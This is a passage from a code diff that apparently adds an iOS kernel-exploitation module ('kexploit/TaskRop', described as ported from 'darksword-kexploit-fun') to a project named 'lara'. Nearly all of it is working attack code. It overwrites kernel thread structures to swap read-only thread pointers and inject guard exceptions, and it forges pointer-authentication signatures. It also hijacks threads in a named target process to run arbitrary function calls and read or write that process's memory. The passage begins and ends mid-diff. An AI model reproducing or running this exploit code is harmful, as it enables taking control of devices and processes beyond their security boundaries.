+        fflush(stdout);
+        memset(dataBuff, 0, 0x1000);
+        
+        bool correctTro = false;
+        uint64_t checkAddr = trunc_page(kernelSP) + found + 0x18ULL;
+        uint64_t checkVal  = kread64(checkAddr);
+        
+        uint64_t checkAddr2 = trunc_page(kernelSP) + found + 0x10ULL;
+        uint64_t checkVal2  = kread64(checkAddr2);
+
+        printf("[%s:%d] [iter %d] checkVal=0x%llx checkVal2=0x%llx (expecting 0x1002)\n", __FUNCTION__, __LINE__, i, checkVal, checkVal2);
+        fflush(stdout);
+
+        if (checkVal == 0x1002 || checkVal2 == 0x1002) {
+            correctTro = true;
+        } else {
+            printf("[%s:%d] [iter %d] Wrong tro checkVals (0x%llx, 0x%llx) != 0x1002. Retry...\n", __FUNCTION__, __LINE__, i, checkVal, checkVal2);
+            fflush(stdout);
+            continue;
+        }
+        
+        if (found && correctTro) {
+            if (thread_get_task(currThread) == g_RC_taskAddr) {
+                uint64_t tro = thread_get_t_tro(currThread);
+                uint64_t swapAddr = trunc_page(kernelSP) + found;
+                printf("[%s:%d] [iter %d] TRO swap: writing target tro=0x%llx to addr=0x%llx\n", __FUNCTION__, __LINE__, i, tro, swapAddr);
+                fflush(stdout);
+                kwrite64(swapAddr, tro);
+                success = true;
+                printf("[%s:%d] TRO swap SUCCESS!\n", __FUNCTION__, __LINE__);
+                fflush(stdout);
+                break;
+            } else {
+                printf("[%s:%d] got empty tro, skip writing\n", __FUNCTION__, __LINE__);
+                fflush(stdout);
+            }
+        } else {
+            NSLog(@"[%s:%d] didnt find tro for 0x%llx", __FUNCTION__, __LINE__, (uint64_t)currThread);
+        }
+    }
+    
+    printf("[%s:%d] set_exception_port_on_thread returning success=%d\n", __FUNCTION__, __LINE__, success);
+    fflush(stdout);
+    
+    thread_set_mutex(g_RC_dummyThreadAddr, 0x40000000);
+    
+    thread_set_exception_ports(g_RC_dummyThreadMach, 0, exceptionPort, EXCEPTION_STATE | MACH_EXCEPTION_CODES, ARM_THREAD_STATE64);
+    
+    if(useMigFilterBypass)
+        usleep(100000);
+
+    return success;
+}
+
+void sign_state(uint64_t signingThread, arm_thread_state64_internal *state, uint64_t pc, uint64_t lr)
+{
+    if(is_pac_supported()) {
+        uint64_t diver = 0;
+        diver = (uint64_t)state->__flags & __DARWIN_ARM_THREAD_STATE64_USER_DIVERSIFIER_MASK;
+        uint64_t discPC = ptrauth_blend_discriminator_wrapper(diver, ptrauth_string_discriminator_special("pc"));
+        uint64_t discLR = ptrauth_blend_discriminator_wrapper(diver, ptrauth_string_discriminator_special("lr"));
+        
+        if (pc) {
+            uint32_t flags = state->__flags;
+            flags &= ~__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC;
+            state->__flags = flags;
+            state->__pc = remote_pac(signingThread, pc, discPC);
+        }
+        if (lr) {
+            uint32_t flags = state->__flags;
+            flags &= ~(__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_LR |
+                       __DARWIN_ARM_THREAD_STATE64_FLAGS_IB_SIGNED_LR);
+            state->__flags = flags;
+            state->__lr = remote_pac(signingThread, lr, discLR);
+        }
+        return;
+    }
+    
+    if(!is_pac_supported()) {
+        if (pc) state->__pc = pc;
+        if (lr) state->__lr = lr;
+    }
+}
+
+uint64_t do_remote_call_temp(int timeout, const char *name,
+    uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
+    uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7)
+{
+    printf("[%s:%d] Calling %s\n", __FUNCTION__, __LINE__, name);
+    fflush(stdout);
+    
+    int newTimeout = (10000 > timeout) ? 10000 : timeout;
+    uint64_t pcAddr = native_strip((uint64_t)dlsym(RTLD_DEFAULT, name));
+    printf("[%s:%d] pcAddr for %s: 0x%llx\n", __FUNCTION__, __LINE__, name, pcAddr);
+    fflush(stdout);
+
+    ExceptionMessage exc;
+    printf("[%s:%d] Waiting for exception...\n", __FUNCTION__, __LINE__);
+    fflush(stdout);
+    if (!wait_exception(g_RC_firstExceptionPort, &exc, newTimeout, false)) {
+        printf("[%s:%d] Don't receive first exception on original thread\n", __FUNCTION__, __LINE__);
+        return 0;
+    }
+    printf("[%s:%d] Exception received, setting up args and replying\n", __FUNCTION__, __LINE__);
+    fflush(stdout);
+
+    exc.threadState.__x[0] = x0;
+    exc.threadState.__x[1] = x1;
+    exc.threadState.__x[2] = x2;
+    exc.threadState.__x[3] = x3;
+    exc.threadState.__x[4] = x4;
+    exc.threadState.__x[5] = x5;
+    exc.threadState.__x[6] = x6;
+    exc.threadState.__x[7] = x7;
+    sign_state(g_RC_trojanThreadAddr, &exc.threadState, pcAddr, FAKE_LR_TROJAN_CREATOR);
+    reply_with_state(&exc, &exc.threadState);
+
+    if (timeout < 0) {
+        printf("[%s:%d] Trojan thread cleanup\n", __FUNCTION__, __LINE__);
+        return 0;
+    }
+
+    ExceptionMessage exc2;
+    if (!wait_exception(g_RC_firstExceptionPort, &exc2, newTimeout, false)) {
+        printf("[%s:%d] Don't receive second exception on original thread\n", __FUNCTION__, __LINE__);
+        return 0;
+    }
+    uint64_t retValue = exc2.threadState.__x[0];
+    reply_with_state(&exc2, &exc2.threadState);
+    printf("[%s:%d] %s func's retValue = 0x%llx(%llu)\n", __FUNCTION__, __LINE__, name, retValue, retValue);
+    if(strcmp(name, "getpid") == 0 && retValue == 0) {
+        printf("[%s:%d] getpid failed\n", __FUNCTION__, __LINE__);
+        printf("[%s:%d] spinning here...\n", __FUNCTION__, __LINE__);
+        while(1) {};
+    }
+    return retValue;
+}
+
+uint64_t do_remote_call_stable(int timeout, const char *name,
+    uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
+    uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7)
+{
+    if (!g_RC_creatingExtraThread)
+        return do_remote_call_temp(timeout, name, x0, x1, x2, x3, x4, x5, x6, x7);
+
+    uint64_t pcAddr = (uint64_t)dlsym(RTLD_DEFAULT, name);
+    if (!pcAddr) {
+        printf("[%s:%d] Unable to find symbol: %s\n", __FUNCTION__, __LINE__, name);
+        return 0;
+    }
+    int newTimeout = (10000 > timeout) ? 10000 : timeout;
+
+    ExceptionMessage exc;
+    if (!wait_exception(g_RC_secondExceptionPort, &exc, newTimeout, false)) {
+        printf("[%s:%d] Don't receive first exception on new thread\n", __FUNCTION__, __LINE__);
+        return 0;
+    }
+
+    exc.threadState.__x[0] = x0;
+    exc.threadState.__x[1] = x1;
+    exc.threadState.__x[2] = x2;
+    exc.threadState.__x[3] = x3;
+    exc.threadState.__x[4] = x4;
+    exc.threadState.__x[5] = x5;
+    exc.threadState.__x[6] = x6;
+    exc.threadState.__x[7] = x7;
+    sign_state(g_RC_trojanThreadAddr, &exc.threadState, pcAddr, FAKE_LR_TROJAN);
+    reply_with_state(&exc, &exc.threadState);
+
+    if (timeout < 0) {
+        printf("[%s:%d] Trojan thread cleanup\n", __FUNCTION__, __LINE__);
+        return 0;
+    }
+
+    ExceptionMessage exc2;
+    if (!wait_exception(g_RC_secondExceptionPort, &exc2, newTimeout, false)) {
+        printf("[%s:%d] Don't receive second exception on new thread\n", __FUNCTION__, __LINE__);
+        return 0;
+    }
+    uint64_t retValue = exc2.threadState.__x[0];
+    reply_with_state(&exc2, &exc2.threadState);
+    printf("[%s:%d] %s func's retValue = 0x%llx(%llu)\n", __FUNCTION__, __LINE__, name, retValue, retValue);
+    return retValue;
+}
+
+bool restore_trojan_thread(arm_thread_state64_internal *state)
+{
+    ExceptionMessage exc;
+    if (!wait_exception(g_RC_firstExceptionPort, &exc, 20000, false)) {
+        printf("[%s:%d] Failed to receive exception while restoring\n", __FUNCTION__, __LINE__);
+        return false;
+    }
+    
+    state->__flags = exc.threadState.__flags;
+    sign_state(g_RC_trojanThreadAddr, state, state->__pc, state->__lr);
+    reply_with_state(&exc, state);
+    return true;
+}
+
+int destroy_remote_call(void) {
+    if (g_RC_trojanMem) {
+        do_remote_call_stable(100, "munmap", g_RC_trojanMem, PAGE_SIZE, 0, 0, 0, 0, 0, 0);
+    }
+    if (g_RC_creatingExtraThread) {
+        do_remote_call_stable(-1, "pthread_exit", 0, 0, 0, 0, 0, 0, 0, 0);
+    }
+    else {
+        restore_trojan_thread(&g_RC_originalState);
+    }
+
+    mach_port_destruct(mach_task_self_, g_RC_firstExceptionPort, 0, 0);
+    mach_port_destruct(mach_task_self_, g_RC_secondExceptionPort, 0, 0);
+    pthread_cancel(g_RC_dummyThread);
+    
+    g_RC_threadList = [NSMutableArray new];
+    
+    return 0;
+}
+
+struct VMShmem *get_shmem_from_cache(uint64_t pageAddr)
+{
+    for (int i = 0; i < SHMEM_CACHE_SIZE; i++) {
+        if (g_RC_shmemCache[i].used && g_RC_shmemCache[i].remoteAddress == pageAddr)
+            return &g_RC_shmemCache[i];
+    }
+    return NULL;
+}
+
+struct VMShmem *put_shmem_in_cache(struct VMShmem *shmem)
+{
+    for (int i = 0; i < SHMEM_CACHE_SIZE; i++) {
+        if (!g_RC_shmemCache[i].used) {
+            g_RC_shmemCache[i] = *shmem;
+            g_RC_shmemCache[i].used = true;
+            return &g_RC_shmemCache[i];
+        }
+    }
+    printf("[%s:%d] g_RC_shmemCache full\n", __FUNCTION__, __LINE__);
+    return NULL;
+}
+
+struct VMShmem *get_shmem_for_page(uint64_t pageAddr)
+{
+    struct VMShmem *cached = get_shmem_from_cache(pageAddr);
+    if (cached) return cached;
+
+    struct VMShmem newShmem = vm_map_remote_page(g_RC_vmMap, pageAddr);
+    if (!newShmem.localAddress)
+            return NULL;
+    return put_shmem_in_cache(&newShmem);
+}
+
+bool remote_read(uint64_t src, void *dst, uint64_t size)
+{
+    if (!src || !dst || !size) return false;
+    uint64_t dstAddr = (uint64_t)(uintptr_t)dst;
+    uint64_t until = src + size;
+
+    while (src < until) {
+        uint64_t remaining = until - src;
+        uint64_t offs      = src & PAGE_MASK;
+        uint64_t roundUp   = (src + PAGE_SIZE) & ~PAGE_MASK;
+        uint64_t copyCount = (roundUp - src < remaining) ? (roundUp - src) : remaining;
+        uint64_t pageAddr  = src & ~PAGE_MASK;
+
+        struct VMShmem *page = get_shmem_for_page(pageAddr);
+        if (!page) {
+            printf("[%s:%d] remote_read failed: unable to find remote page\n", __FUNCTION__, __LINE__);
+            return false;
+        }
+        memcpy((void *)(uintptr_t)dstAddr, (void *)(uintptr_t)(page->localAddress + offs), (size_t)copyCount);
+        src     += copyCount;
+        dstAddr += copyCount;
+    }
+    return true;
+}
+
+uint64_t remote_read64(uint64_t src)
+{
+    uint64_t val = 0;
+    if (!remote_read(src, &val, sizeof(val))) return 0;
+    return val;
+}
+
+void remote_hexdump(uint64_t remoteAddr, size_t size)
+{
+    uint8_t *buf = (uint8_t *)malloc(size);
+    if (!buf) {
+        return;
+    }
+
+    if (!remote_read(remoteAddr, buf, size)) {
+        printf("[%s:%d] remote_read failed at 0x%llx\n", __FUNCTION__, __LINE__, (unsigned long long)remoteAddr);
+        free(buf);
+        return;
+    }
+
+    char ascii[17];
+    ascii[16] = '\0';
+    for (size_t i = 0; i < size; ++i) {
+        if ((i % 16) == 0)
+            printf("[0x%016llx+0x%03zx] ", (unsigned long long)remoteAddr, i);
+
+        printf("%02X ", buf[i]);
+        ascii[i % 16] = (buf[i] >= ' ' && buf[i] <= '~') ? buf[i] : '.';
+
+        if ((i + 1) % 8 == 0 || i + 1 == size) {
+            printf(" ");
+            if ((i + 1) % 16 == 0) {
+                printf("|  %s \n", ascii);
+            } else if (i + 1 == size) {
+                ascii[(i + 1) % 16] = '\0';
+                if ((i + 1) % 16 <= 8) printf(" ");
+                for (size_t j = (i + 1) % 16; j < 16; ++j)
+                    printf("   ");
+                printf("|  %s \n", ascii);
+            }
+        }
+    }
+
+    free(buf);
+}
+
+bool remote_write(uint64_t dst, const void *src, uint64_t size)
+{
+    if (!src || !dst || !size) return false;
+    
+    uint64_t srcAddr = (uint64_t)(uintptr_t)src;
+    uint64_t until   = dst + size;
+
+    while (dst < until) {
+        uint64_t remaining = until - dst;
+        uint64_t offs      = dst & PAGE_MASK;
+        uint64_t roundUp   = (dst + PAGE_SIZE) & ~PAGE_MASK;
+        uint64_t copyCount = (roundUp - dst < remaining) ? (roundUp - dst) : remaining;
+        uint64_t pageAddr  = dst & ~PAGE_MASK;
+
+        struct VMShmem *page = get_shmem_for_page(pageAddr);
+        if (!page) {
+            printf("[%s:%d] remote_write failed: unable to find remote page\n", __FUNCTION__, __LINE__);
+            return false;
+        }
+
+        memcpy((void *)(uintptr_t)(page->localAddress + offs), (const void *)(uintptr_t)srcAddr, (size_t)copyCount);
+        dst     += copyCount;
+        srcAddr += copyCount;
+    }
+    return true;
+}
+
+bool remote_write64(uint64_t dst, uint64_t val)
+{
+    return remote_write(dst, &val, sizeof(val));
+}
+
+bool remote_writeStr(uint64_t dst, const char *str)
+{
+    if (!str) return false;
+
+    size_t len = strlen(str) + 1;
+    return remote_write(dst, str, len);
+}
+
+uint64_t retry_first_thread(bool useMigFilterBypass) {
+    if (useMigFilterBypass)
+        mig_bypass_pause();
+    
+    sleep(1);
+    
+    if (useMigFilterBypass)
+        mig_bypass_resume();
+    
+    return kread64(g_RC_taskAddr + off_task_threads_next);
+}
+
+// NOTE: Do not run this function while "attaching xcode" on iOS 18+, it will make device unstable.
+int init_remote_call(const char* process, bool useMigFilterBypass) {
+    
+    uint64_t procAddr = proc_find_by_name(process);
+    printf("[%s:%d] process: %s, pid: %u\n",  __FUNCTION__, __LINE__, process, kread32(procAddr + off_proc_p_pid));
+    g_RC_taskAddr = proc_task(procAddr);
+    
+    mach_port_t firstExceptionPort = create_exception_port();
+    mach_port_t secondExceptionPort = create_exception_port();
+    
+    printf("[%s:%d] firstExceptionPort: 0x%x, secondExceptionPort: 0x%x\n", __FUNCTION__, __LINE__, firstExceptionPort, secondExceptionPort);
+    
+    if (!firstExceptionPort || !secondExceptionPort)
+    {
+        printf("[%s:%d] Couldn't create exception ports\n", __FUNCTION__, __LINE__);
+        mach_port_destruct(mach_task_self_, firstExceptionPort, 0, 0);
+        mach_port_destruct(mach_task_self_, secondExceptionPort, 0, 0);
+        return -1;
+    }
+    
+    disable_excguard_kill(g_RC_taskAddr);
+    
+    mach_exception_code_t guardCode = 0;
+    EXC_GUARD_ENCODE_TYPE(guardCode, GUARD_TYPE_MACH_PORT);
+    EXC_GUARD_ENCODE_FLAVOR(guardCode, kGUARD_EXC_INVALID_RIGHT);
+    EXC_GUARD_ENCODE_TARGET(guardCode, 0xf503ULL);
+    
+    uint64_t firstPortAddr = task_get_ipc_port_kobject(task_self(), firstExceptionPort);
+    uint64_t secondPortAddr = task_get_ipc_port_kobject(task_self(), secondExceptionPort);
+    
+    pthread_t dummyThread = NULL;
+    void *dummyFunc = dlsym(RTLD_DEFAULT, "getpid");
+    pthread_create_suspended_np(&dummyThread, NULL, (void *(*)(void *))dummyFunc, NULL);
+    mach_port_t dummyThreadMach = pthread_mach_thread_np(dummyThread);
+    uint64_t dummyThreadAddr = task_get_ipc_port_kobject(task_self(), dummyThreadMach);
+    uint64_t dummyThreadTro = kread64(dummyThreadAddr + off_thread_t_tro);
+    mach_port_t threadSelf = mach_thread_self();
+    uint64_t selfThreadAddr = task_get_ipc_port_kobject(task_self(), threadSelf);
+    uint32_t selfThreadCtid = kread32(selfThreadAddr + off_thread_ctid);
+    
+    g_RC_creatingExtraThread = true;
+    g_RC_firstExceptionPort = firstExceptionPort;
+    g_RC_secondExceptionPort = secondExceptionPort;
+    g_RC_firstExceptionPortAddr = firstPortAddr;
+    g_RC_secondExceptionPortAddr = secondPortAddr;
+    g_RC_dummyThread = dummyThread;
+    g_RC_dummyThreadMach = dummyThreadMach;
+    g_RC_dummyThreadAddr = dummyThreadAddr;
+    g_RC_dummyThreadTro = dummyThreadTro;
+    g_RC_selfThreadAddr = selfThreadAddr;
+    g_RC_selfThreadCtid = selfThreadCtid;
+    
+    g_RC_threadList = [NSMutableArray new];
+    
+    int retryCount = 0;
+    int validThreadCount = 0;
+    int successThreadCount = 0;
+    uint64_t firstThread = kread64(g_RC_taskAddr + off_task_threads_next);
+    uint64_t currThread = firstThread;
+    
+    g_RC_trojanThreadAddr = firstThread;
+    
+    if (useMigFilterBypass)
+        mig_bypass_resume();
+    
+    while (successThreadCount < 2 && validThreadCount < 5 && retryCount < 3) {
+        uint64_t task = thread_get_task(currThread);
+        if (!task) {
+            if (!validThreadCount) {
+                printf("[%s:%d] failed on getting first thread at all, resetting\n", __FUNCTION__, __LINE__);
+                firstThread = retry_first_thread(useMigFilterBypass);
+                currThread = firstThread;
+                retryCount++;
+                continue;
+            } else {
+                break;
+            }
+        }
+        
+        if (task == g_RC_taskAddr) {
+            if (!set_exception_port_on_thread(g_RC_firstExceptionPort, currThread, useMigFilterBypass)) {
+                printf("[%s:%d] Set exception port on thread:0x%llx failed\n", __FUNCTION__, __LINE__, (unsigned long long)currThread);
+                if (!validThreadCount) {
+                    printf("[%s:%d] failed on first thread, resetting first thread and currThread\n", __FUNCTION__, __LINE__);
+                    firstThread = retry_first_thread(useMigFilterBypass);
+                    currThread = firstThread;
+                    retryCount++;
+                    continue;
+                }
+            } else {
+                if (!inject_guard_exception(currThread, guardCode)) {
+                    printf("[%s:%d] Inject EXC_GUARD on thread:0x%llx failed, not injecting\n", __FUNCTION__, __LINE__, (unsigned long long)currThread);
+                    if (!validThreadCount) {
+                        printf("[%s:%d] failed on first thread, resetting first thread and currThread\n", __FUNCTION__, __LINE__);
+                        firstThread = retry_first_thread(useMigFilterBypass);
+                        currThread = firstThread;
+                        retryCount++;
+                        continue;
+                    }
+                } else {
+                    successThreadCount++;
+                    [g_RC_threadList addObject:@(currThread)];
+                    printf("[%s:%d] Inject EXC_GUARD on thread:0x%llx OK\n", __FUNCTION__, __LINE__, (unsigned long long)currThread);
+                }
+            }
+            validThreadCount++;
+        } else if (task && !validThreadCount) {
+            printf("[%s:%d] Got weird tro on first thread, resetting\n", __FUNCTION__, __LINE__);
+            firstThread = retry_first_thread(useMigFilterBypass);
+            currThread = firstThread;
+            retryCount++;
+            continue;
+        }
+        
+        uint64_t next = kread64(currThread + off_thread_task_threads_next);
+        if (!next) {
+            if (!validThreadCount) {
+                printf("[%s:%d] Got empty next thread. Retry\n", __FUNCTION__, __LINE__);
+                firstThread = retry_first_thread(useMigFilterBypass);
+                currThread = firstThread;
+                retryCount++;
+                continue;
+            } else {
+                printf("[%s:%d] Break because of empty next thread\n", __FUNCTION__, __LINE__);
+                break;
+            }
+        }
+        currThread = next;
+    }
+    
+    if(useMigFilterBypass)
+        mig_bypass_pause();
+    
+    printf("[%s:%d] Valid threads: %d\n", __FUNCTION__, __LINE__, validThreadCount);
+    printf("[%s:%d] Injected threads: %d\n", __FUNCTION__, __LINE__, successThreadCount);
+    
+    if (g_RC_threadList.count == 0) {
+        printf("[%s:%d] Exception injection failed. Aborting.\n", __FUNCTION__, __LINE__);
+        destroy_remote_call();
+        return -1;
+    }
+    
+    ExceptionMessage exc;
+    if(!wait_exception(firstExceptionPort, &exc, 120000, false)) {
+        printf("[%s:%d] Failed to receive first exception\n", __FUNCTION__, __LINE__);
+        destroy_remote_call();
+        return -1;
+    }
+    
+    memcpy(&g_RC_originalState, &exc.threadState, sizeof(arm_thread_state64_internal));
+    
+    for (NSNumber *thread in g_RC_threadList) {
+        clear_guard_exception(thread.unsignedLongLongValue);
+    }
+    printf("[%s:%d] Finish clearing EXC_GUARD from all other threads...\n", __FUNCTION__, __LINE__);
+    
+    ExceptionMessage exc2;
+    int desiredTimeout = 1500;
+    while (wait_exception(firstExceptionPort, &exc2, desiredTimeout, false)) {
+        reply_with_state(&exc2, &exc2.threadState);
+    }
+    
+    uint64_t trojanMemTemp = ((uint64_t)exc.threadState.__sp & 0x7fffffffffULL) - 0x100ULL;
+    printf("[%s:%d] trojanMemTemp: 0x%llx\n", __FUNCTION__, __LINE__, trojanMemTemp);
+    fflush(stdout);
+    
+    arm_thread_state64_internal newState = exc.threadState;
+    printf("[%s:%d] calling sign_state for FAKE_PC_TROJAN_CREATOR...\n", __FUNCTION__, __LINE__);
+    fflush(stdout);
+    sign_state(firstThread, &newState, FAKE_PC_TROJAN_CREATOR, FAKE_LR_TROJAN_CREATOR);
+    printf("[%s:%d] sign_state done, pc=0x%llx lr=0x%llx flags=0x%x\n",
+           __FUNCTION__, __LINE__, newState.__pc, newState.__lr, newState.__flags);
+    fflush(stdout);
+    reply_with_state(&exc, &newState);
+    printf("[%s:%d] reply_with_state done, waiting for crash...\n", __FUNCTION__, __LINE__);
+    fflush(stdout);
+    
+    printf("[%s:%d] vmMap: 0x%llx\n", __FUNCTION__, __LINE__, g_RC_vmMap);
+    fflush(stdout);
+    
+    printf("[%s:%d] signing FAKE_PC_TROJAN via remote_pac...\n", __FUNCTION__, __LINE__);
+    fflush(stdout);
+    uint64_t remoteCrashSigned = remote_pac(g_RC_trojanThreadAddr, FAKE_PC_TROJAN, 0);
+    printf("[%s:%d] remoteCrashSigned: 0x%llx\n", __FUNCTION__, __LINE__, remoteCrashSigned);
+    fflush(stdout);
+    do_remote_call_temp(100, "getpid", 0, 0, 0, 0, 0, 0, 0, 0); // for testing
+    do_remote_call_temp(100, "pthread_create_suspended_np", trojanMemTemp, 0, remoteCrashSigned, 0, 0, 0, 0, 0);
+    
+    printf("[%s:%d] trojanMemTemp: 0x%llx\n", __FUNCTION__, __LINE__, trojanMemTemp);
+    uint64_t pthreadAddr    = remote_read64(trojanMemTemp);
+    printf("[%s:%d] pthreadAddr: 0x%llx\n", __FUNCTION__, __LINE__, pthreadAddr);
+    uint64_t callThreadPort = do_remote_call_temp(100, "pthread_mach_thread_np", pthreadAddr, 0, 0, 0, 0, 0, 0, 0);
+    printf("[%s:%d] callThreadPort: 0x%llx\n", __FUNCTION__, __LINE__, callThreadPort);
+    g_RC_callThreadAddr = task_get_ipc_port_kobject(g_RC_taskAddr, (mach_port_t)callThreadPort);
+    
+    if(useMigFilterBypass)
+        mig_bypass_resume();
+    
+    if (!set_exception_port_on_thread(secondExceptionPort, g_RC_callThreadAddr, useMigFilterBypass)) {
+        printf("[%s:%d] Failed set exc port on new thread, retrying...\n", __FUNCTION__, __LINE__);
+        pthread_create_suspended_np(&dummyThread, NULL, (void *(*)(void *))dummyFunc, NULL);
+        g_RC_dummyThreadMach = pthread_mach_thread_np(dummyThread);
+        g_RC_dummyThreadAddr = task_get_ipc_port_kobject(mach_task_self_, g_RC_dummyThreadMach);
+        g_RC_dummyThreadTro  = kread64(g_RC_dummyThreadAddr + off_thread_t_tro);
+        sleep(1);
+        if (!set_exception_port_on_thread(secondExceptionPort, g_RC_callThreadAddr, useMigFilterBypass)) {
+            if(useMigFilterBypass)
+                mig_bypass_pause();
+            destroy_remote_call();
+            return -1;
+        }
+    }
+    
+    if(useMigFilterBypass)
+        mig_bypass_pause();
+    
+    printf("[%s:%d] All good! Resuming trojan thread...\n", __FUNCTION__, __LINE__);
+    
+    uint64_t ret = do_remote_call_temp(100, "thread_resume", callThreadPort, 0, 0, 0, 0, 0, 0, 0);
+    if (ret != 0) {
+        printf("[%s:%d] Couldn't resume new thread, falling back to original\n", __FUNCTION__, __LINE__);
+        g_RC_creatingExtraThread = false;
+    }
+    
+    if (g_RC_creatingExtraThread) {
+        printf("[%s:%d] New thread created, resuming original\n", __FUNCTION__, __LINE__);
+        restore_trojan_thread(&g_RC_originalState);
+    }
+    printf("[%s:%d] Original thread restored\n", __FUNCTION__, __LINE__);
+    
+    g_RC_pid = (int)do_remote_call_stable(100, "getpid", 0, 0, 0, 0, 0, 0, 0, 0);
+    printf("[%s:%d] Task pid: %d\n", __FUNCTION__, __LINE__, g_RC_pid);
+    
+    g_RC_trojanMem = do_remote_call_stable(1000, "mmap", 0, PAGE_SIZE, VM_PROT_READ | VM_PROT_WRITE, MAP_PRIVATE | MAP_ANON, (uint64_t)-1, 0, 0, 0);
+    
+    do_remote_call_stable(100, "memset", g_RC_trojanMem, 0, PAGE_SIZE, 0, 0, 0, 0, 0);
+    
+    g_RC_success = true;
+    printf("[%s:%d] Finished successfully\n", __FUNCTION__, __LINE__);
+    
+    return 0;
+}
  ```

  </details>
- 🟢 `lara/kexploit/TaskRop/Thread.h` (added) — +25 / -0
  <details><summary>Diff</summary>

  ```diff
  @@ -0,0 +1,25 @@
+//
+//  Thread.h
+//  lara
+//
+//  Ported from darksword-kexploit-fun
+//  Original by seo on 4/4/26.
+//
+
+#ifndef Thread_h
+#define Thread_h
+
+#import <stdbool.h>
+#import <stdint.h>
+#import <mach/mach.h>
+
+#import "RemoteCall.h"
+
+bool inject_guard_exception(uint64_t thread, uint64_t code);
+void clear_guard_exception(uint64_t thread);
+bool thread_get_state_wrapper(mach_port_t machThread, arm_thread_state64_internal *outState);
+bool thread_set_state_wrapper(mach_port_t machThread, uint64_t threadAddr, arm_thread_state64_internal *state);
+bool thread_resume_wrapper(mach_port_t machThread);
+void thread_set_pac_keys(uint64_t threadAddr, uint64_t keyA, uint64_t keyB);
+
+#endif /* Thread_h */
  ```

  </details>
- 🟢 `lara/kexploit/TaskRop/Thread.m` (added) — +115 / -0
  <details><summary>Diff</summary>

  ```diff
  @@ -0,0 +1,115 @@
+//
+//  Thread.m
+//  lara
+//
+//  Ported from darksword-kexploit-fun
+//  Original by seo on 4/4/26.
+//
+
+#import "Thread.h"
+
+#import <Foundation/Foundation.h>
+#import <UIKit/UIKit.h>
+#import "../krw_compat.h"
+#import "../utils.h"
+#import "../offsets.h"
+
+// xnu-10002.81.5/osfmk/kern/ast.h
+#define AST_GUARD               0x1000
+
+// xnu-10002.81.5/osfmk/kern/thread.h
+#define TH_IN_MACH_EXCEPTION    0x8000          /* Thread is currently handling a mach exception */
+
+// xnu-11417.140.69/bsd/sys/reason.h
+#define OS_REASON_GUARD         23
+
+bool inject_guard_exception(uint64_t thread, uint64_t code)
+{
+    if (!thread_get_t_tro(thread))
+    {
+        printf("[%s:%d] got invalid tro of thread, not injecting exception since thread is dead\n", __FUNCTION__, __LINE__);
+        return false;
+    }
+    
+    if(SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"18.4")) {
+        kwrite32(thread + off_thread_mach_exc_info_os_reason, OS_REASON_GUARD);
+        kwrite32(thread + off_thread_mach_exc_info_exception_type, 0);
+        kwrite64(thread + off_thread_mach_exc_info_code, code);
+    } else {
+        kwrite64(thread + off_thread_guard_exc_info_code, code);
+    }
+    
+    uint32_t ast = kread32(thread + off_thread_ast);
+    ast |= AST_GUARD;
+    kwrite32(thread + off_thread_ast, ast);
+    return true;
+}
+
+void clear_guard_exception(uint64_t thread)
+{
+    if (!thread_get_t_tro(thread))
+        printf("[%s:%d] invalid tro, still clearing to avoid crash\n", __FUNCTION__, __LINE__);
+
+    uint32_t ast = kread32(thread + off_thread_ast);
+    ast &= ~AST_GUARD | 0x80000000;
+    kwrite32(thread + off_thread_ast, ast);
+    
+    if(SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"18.4")) {
+        if(kread32(thread + off_thread_mach_exc_info_os_reason) == OS_REASON_GUARD && kread32(thread + off_thread_mach_exc_info_exception_type) == 0) {
+            kwrite32(thread + off_thread_mach_exc_info_os_reason, 0);
+            kwrite32(thread + off_thread_mach_exc_info_exception_type, 0);
+            kwrite64(thread + off_thread_mach_exc_info_code, 0);
+        }
+    } else {
+        kwrite64(thread + off_thread_guard_exc_info_code, 0);
+    }
+}
+
+bool thread_get_state_wrapper(mach_port_t machThread, arm_thread_state64_internal *outState)
+{
+    mach_msg_type_number_t count = ARM_THREAD_STATE64_COUNT;
+    kern_return_t kr = thread_get_state(machThread, ARM_THREAD_STATE64, (thread_state_t)outState, &count);
+    if (kr != KERN_SUCCESS) {
+        printf("[%s:%d] Unable to read thread state: 0x%x (%s)\n", __FUNCTION__, __LINE__, kr, mach_error_string(kr));
+        return false;
+    }
+    return true;
+}
+
+bool thread_set_state_wrapper(mach_port_t machThread, uint64_t threadAddr, arm_thread_state64_internal *state)
+{
+    uint16_t options = 0;
+    if (threadAddr) {
+        options = thread_get_options(threadAddr);
+        options |= TH_IN_MACH_EXCEPTION;
+        thread_set_options(threadAddr, options);
+    }
+
+    kern_return_t kr = thread_set_state(machThread, ARM_THREAD_STATE64, (thread_state_t)state, ARM_THREAD_STATE64_COUNT);
+    if (kr != KERN_SUCCESS) {
+        printf("[%s:%d] Failed thread_set_state: 0x%x (%s)\n", __FUNCTION__, __LINE__, kr, mach_error_string(kr));
+        return false;
+    }
+
+    if (threadAddr) {
+        options &= ~TH_IN_MACH_EXCEPTION;
+        thread_set_options(threadAddr, options);
+    }
+    return true;
+}
+
+bool thread_resume_wrapper(mach_port_t machThread)
+{
+    kern_return_t kr = thread_resume(machThread);
+    if (kr != KERN_SUCCESS) {
+        printf("[%s:%d] Unable to resume thread: 0x%x (%s)\n", __FUNCTION__, __LINE__, kr, mach_error_string(kr));
+        return false;
+    }
+    return true;
+}
+
+void thread_set_pac_keys(uint64_t threadAddr, uint64_t keyA, uint64_t keyB)
+{
+    kwrite64(threadAddr + off_thread_machine_rop_pid, keyA);
+    kwrite64(threadAddr + off_thread_machine_jop_pid, keyB);
+}
  ```

  </details>
- 🟢 `lara/kexploit/TaskRop/VM.h` (added) — +110 / -0
  <details><summary>Diff</summary>

  ```diff
  @@ -0,0 +1,110 @@
+//
+//  VM.h
+//  lara
+//
+//  Ported from darksword-kexploit-fun
+//
+
+#ifndef VM_H
+#define VM_H
+
+#include "RemoteCall.h"
+
+struct VMObject {
+    uint64_t vmAddress;
+    uint64_t address;
+    uint64_t objectOffset;
+    uint64_t entryOffset;
+};
+
+struct VmPackingParams {
+    uint64_t vmpp_base;
